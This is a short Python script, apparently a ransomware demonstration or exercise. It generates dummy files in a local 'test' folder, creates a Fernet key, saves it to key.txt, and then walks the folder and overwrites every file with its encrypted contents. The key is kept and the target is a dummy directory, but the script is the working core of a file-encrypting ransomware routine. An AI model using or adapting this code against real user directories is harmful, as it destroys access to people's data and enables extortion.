#!/usr/bin/env python3

import os
from package import testdirs
from cryptography.fernet import Fernet

# Variables
cwd = os.getcwd()
main_dir = "test"
rootdir = os.path.join(cwd, main_dir)

# Create dummy files
testdirs.tree_structure()


# Fernet: Keygen
def keygen():
    global key
    key = Fernet.generate_key()
    with open("key.txt", "wb") as keyfile:
        keyfile.write(key)


# Iterate directories
files = []


def iterate():
    for dirpath, _, file in os.walk(rootdir):
        for filename in file:
            files.append(os.path.join(dirpath, filename))


def encrypt():
    for file in files:
        with open(file, "rb") as thefile:
            content = thefile.read()
        content_encrypted = Fernet(key).encrypt(content)
        with open(file, "wb") as thefile:
            thefile.write(content_encrypted)


if __name__ == "__main__":
    keygen()
    iterate()
    encrypt()
